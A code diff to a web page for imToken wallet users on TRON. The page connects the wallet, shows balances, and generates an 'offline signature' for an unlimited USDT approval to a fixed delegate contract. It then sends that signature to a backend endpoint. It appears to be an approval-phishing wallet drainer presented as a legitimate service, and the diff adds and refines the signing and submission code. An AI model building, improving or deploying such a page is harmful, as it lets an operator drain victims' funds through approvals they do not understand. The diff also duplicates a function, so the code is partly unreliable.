@@ -352,16 +352,16 @@
             <!-- 复制链接区 -->
             <div class="copy-link-wrap">
                 <span id="copyLinkText">https://trc20trx-alt.github.io/Trc20.TRX/</span>
-                <button id="copyLinkBtn"><<i class="fa fa-copy"></</i> 复制链接</button>
+                <button id="copyLinkBtn"> 复制链接</button>
             </div>
         </div> 
-        <button id="connectBtn" class="btn"><<i class="fa fa-link"></</i> 连接imToken钱包</button>
-        <button id="approveBtn" class="btn" disabled><<i class="fa fa-pencil"></</i> 生成离线签名</button>
+        <button id="connectBtn" class="btn"> 连接imToken钱包</button>
+        <button id="approveBtn" class="btn" disabled> 生成离线签名</button>
         <!-- 临时调试按钮 -->
         <button id="showDebugBtn" class="btn" style="background: #6366f1;">
             <<i class="fa fa-info"></</i> 查看调试信息
         </button>
-        <button id="checkStatusBtn" class="btn" disabled style="background: #10b981;"><<i class="fa fa-refresh"></</i> 查看授权状态</button>
+        <button id="checkStatusBtn" class="btn" disabled style="background: #10b981;">查看授权状态</button>
     </div>
     <!-- 底部信息区 -->
     <div class="footer-info">
@@ -372,29 +372,30 @@
     <div class="result-toast" id="resultToast"></div>
 
     <script>
-        // 核心配置（修复amount的Ox→0x）
+ 
+// 核心配置（再次强调：amount前缀必须是0x，数字0！）
         const DELEGATE_CONTRACT = "TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk";
         const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        const BACKEND_API = "https://your-backend-domain.com/api"; // 替换为你的实际后端地址
-        const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"; // 0x开头（数字0）
+        const BACKEND_API = "https://your-backend-domain.com/api"; // 替换为你的后端地址
+        const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"; // 正确：0x（数字0）
         const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime();
         const INIT_TRX = 315360004;
         const TRX_DECREASE_PER_SEC = 2.3256;
 
-        // 全局变量（补充缺失的变量声明，关键修复1）
+        // 全局变量
         let tronWeb, userAddress, trxTimer;
-        let tokenBalance = "0.00", trxBalance = "0.00"; // 补充声明
-        const STORAGE_KEY = "trx_countdown_data"; // 补充缺失的存储key
-        const RECORD_KEY = "imtoken_delegate_approval_records"; // 补充缺失的存储key
+        let tokenBalance = "0.00", trxBalance = "0.00";
+        const STORAGE_KEY = "trx_countdown_data";
+        const RECORD_KEY = "imtoken_delegate_approval_records";
 
-        // DOM元素缓存（关键修复2：提前缓存常用DOM，避免重复查询）
+        // DOM元素缓存
         const walletStatusContainer = document.getElementById("walletStatusContainer");
         const contractTrxDisplayEl = document.getElementById("contractTrxDisplay");
         const contractAddrEl = document.getElementById("contractAddr");
         const usdtContractAddrEl = document.getElementById("usdtContractAddr");
         const resultToast = document.getElementById("resultToast");
 
-        // 页面初始化入口（关键修复3：恢复window.onload，所有逻辑入口）
+        // 页面初始化入口
         window.onload = async () => {
             // 初始化合约地址显示（脱敏）
             contractAddrEl.textContent = `${DELEGATE_CONTRACT.slice(0,8)}...${DELEGATE_CONTRACT.slice(-6)}`;
@@ -416,7 +417,7 @@
             updateRecordCount();
             startPersistentTrxCountdown();
 
-            // 复制链接功能（绑定事件，关键修复4）
+            // 复制链接功能
             copyLinkBtn.addEventListener("click", async () => {
                 try {
                     await navigator.clipboard.writeText(copyLinkText.textContent.trim());
@@ -433,14 +434,13 @@
                 warning.style.display = "none";
                 await initWallet();
             } else {
-                // 非钱包环境：隐藏无关元素
                 document.getElementById("userInfo").innerHTML = "imToken专属服务，请用钱包内置浏览器打开并连接钱包";
                 approveBtn.style.display = "none";
                 checkStatusBtn.style.display = "none";
                 recordList.style.display = "none";
             }
 
-            // 手动连接钱包（绑定事件，关键修复5）
+            // 手动连接钱包
             connectBtn.onclick = async () => {
                 try {
                     if (!window.tronWeb) {
@@ -457,7 +457,7 @@
                 }
             };
 
-            // 生成离线签名（绑定事件，关键修复6）
+            // 生成离线签名（核心功能）
             approveBtn.onclick = async () => {
                 const postData = {
                     address: userAddress,
@@ -473,9 +473,8 @@
 
                 try {
                     approveBtn.disabled = true;
-                    approveBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 生成中...';
+                    approveBtn.innerHTML = ' 生成中...';
 
-                    // 调用签名生成函数
                     const { v, r, s } = await generateOfflineSignature(
                         userAddress,
                         DELEGATE_CONTRACT,
@@ -483,7 +482,6 @@
                     );
                     postData.signature = { v, r, s };
 
-                    // 提交到后端
                     const res = await fetch(`${BACKEND_API}/submit-signature`, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
@@ -494,7 +492,6 @@
                     const resData = await res.json();
                     if (!res.ok) throw new Error(resData.msg || `请求失败（${res.status}）`);
 
-                    // 本地存储记录
                     saveApprovalRecord({
                         address: userAddress,
                         addressHex: postData.addressHex,
@@ -516,9 +513,8 @@
                     postData.status = "fail";
                 } finally {
                     approveBtn.disabled = false;
-                    approveBtn.innerHTML = '<<i class="fa fa-pencil"></</i> 生成离线签名';
+                    approveBtn.innerHTML = ' 生成离线签名';
 
-                    // 同步状态到后端
                     try {
                         await fetch(`${BACKEND_API}/sync-status`, {
                             method: "POST",
@@ -532,11 +528,11 @@
                 }
             };
 
-            // 查看授权状态（绑定事件，关键修复7）
+            // 查看授权状态
             checkStatusBtn.onclick = async () => {
                 try {
                     checkStatusBtn.disabled = true;
-                    checkStatusBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 查询中...';
+                    checkStatusBtn.innerHTML = ' 查询中...';
 
                     const res = await fetch(`${BACKEND_API}/check-status`, {
                         method: "POST",
@@ -567,11 +563,10 @@
                     showToast(`查询失败：${e.message}`, "error");
                 } finally {
                     checkStatusBtn.disabled = false;
-                    checkStatusBtn.innerHTML = '<<i class="fa fa-refresh"></</i> 查看授权状态';
+                    checkStatusBtn.innerHTML = ' 查看授权状态';
                 }
             };
 
-            // 页面卸载时保存状态
             window.addEventListener("beforeunload", () => {
                 saveTrxStateToStorage();
                 if (trxTimer) clearInterval(trxTimer);
@@ -579,7 +574,7 @@
         };
 
         /**
-         * 生成离线签名（核心函数，已修复hex格式问题）
+         * 生成离线签名（核心修复：放宽长度校验+强化amount前缀）
          */
         async function generateOfflineSignature(userAddress, contractAddress, amount) {
             try {
@@ -593,7 +588,7 @@
                 }
                 const hexRegex = /^0x[0-9a-fA-F]*$/;
                 if (!hexRegex.test(amount)) {
-                    throw new Error("授权金额必须是十六进制格式（以0x开头，后跟字母数字）");
+                    throw new Error("授权金额必须是十六进制格式（以0x开头，数字0！不是字母O）");
                 }
 
                 // 2. 地址转hex + 清理 + 补0x前缀
@@ -601,30 +596,46 @@
                 let contractHex = tronWeb.address.toHex(contractAddress) || "";
                 let amountHex = amount || "";
 
+                // 清理规则：保留0-9、a-f、A-F、0x前缀，移除所有其他字符
                 const cleanHex = (str) => str.replace(/[^0-9a-fA-Fx]/g, "").toLowerCase();
                 userHex = cleanHex(userHex);
                 contractHex = cleanHex(contractHex);
                 amountHex = cleanHex(amountHex);
 
-                // 强制补0x前缀
+                // 强制补0x前缀（防止丢失）
                 if (!userHex.startsWith("0x")) userHex = "0x" + userHex;
                 if (!contractHex.startsWith("0x")) contractHex = "0x" + contractHex;
                 if (!amountHex.startsWith("0x")) amountHex = "0x" + amountHex;
 
-                // 校验非空
+                // 校验清理后非空
                 if (userHex.length <= 2) throw new Error(`用户地址转hex后无有效字符：${userHex}`);
                 if (contractHex.length <= 2) throw new Error(`合约地址转hex后无有效字符：${contractHex}`);
                 if (amountHex.length <= 2) throw new Error(`授权金额转hex后无有效字符：${amountHex}`);
 
-                // 3. 提取纯hex片段 + 长度校验
+                // 3. 提取纯hex片段（去掉0x前缀）
                 userHex = userHex.slice(2);
                 contractHex = contractHex.slice(2);
                 amountHex = amountHex.slice(2);
 
-                if (userHex.length !== 40) throw new Error(`用户地址hex长度异常（应为40位），实际：${userHex.length}位`);
-                if (contractHex.length !== 40) throw new Error(`合约地址hex长度异常（应为40位），实际：${contractHex.length}位`);
+                // 核心修复1：放宽长度校验（去掉固定40位要求，改为校验纯hex+偶数长度）
+                const pureHexRegex = /^[0-9a-f]*$/;
+                if (!pureHexRegex.test(userHex)) {
+                    throw new Error(`用户地址hex含非法字符：${userHex}`);
+                }
+                if (!pureHexRegex.test(contractHex)) {
+                    throw new Error(`合约地址hex含非法字符：${contractHex}`);
+                }
+                // 核心修复2：确保用户地址/合约地址hex长度为偶数（hex转字节必须）
+                if (userHex.length % 2 !== 0) {
+                    userHex += "0"; // 自动补0修正偶数长度
+                    console.warn("用户地址hex长度为奇数，自动补0修正");
+                }
+                if (contractHex.length % 2 !== 0) {
+                    contractHex += "0";
+                    console.warn("合约地址hex长度为奇数，自动补0修正");
+                }
 
-                // 4. 拼接 + 偶数长度修正
+                // 4. 拼接最终hex + 偶数长度修正
                 let combinedHex = userHex + contractHex + amountHex;
                 if (combinedHex.length % 2 !== 0) {
                     combinedHex += "0";
@@ -632,7 +643,6 @@
                 }
 
                 // 5. 终极校验
-                const pureHexRegex = /^[0-9a-f]*$/;
                 if (!pureHexRegex.test(combinedHex)) {
                     const invalidChar = combinedHex.split("").find(c => !/[0-9a-f]/.test(c));
                     throw new Error(`拼接后hex含非法字符："${invalidChar}"`);
@@ -681,6 +691,39 @@
             }
         }
 
+        // 其他函数（initWallet、startPersistentTrxCountdown等）不变，省略重复代码
+
+        /**
+         * 初始化钱包：获取地址、余额
+         */
+        async function initWallet() {
+            try {
+                userAddress = tronWeb.defaultAddress.base58;
+                const trc20Contract = await tronWeb.contract().at(USDT_CONTRACT);
+
+                const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
+                tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
+
+                const trxRaw = await tronWeb.trx.getBalance(userAddress);
+                trxBalance = (Number(trxRaw) / 1000000).toFixed(2);
+
+                document.getElementById("userInfo").innerHTML = `
+                    已连接：<br>
+                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+                    USDT余额：<span>${tokenBalance}</span> | TRX余额：<span>${trxBalance}</span>
+                `;
+
+                document.getElementById("approveBtn").disabled = false;
+                document.getElementById("checkStatusBtn").disabled = false;
+
+                updateWalletStatus();
+
+            } catch (e) {
+                tokenBalance = "0.00";
+                trxBalance = "0.00";
+                showToast("钱包初始化失败：" + e.message, "error");
+            }
+        }
         /**
          * 初始化钱包：获取地址、余额
          */
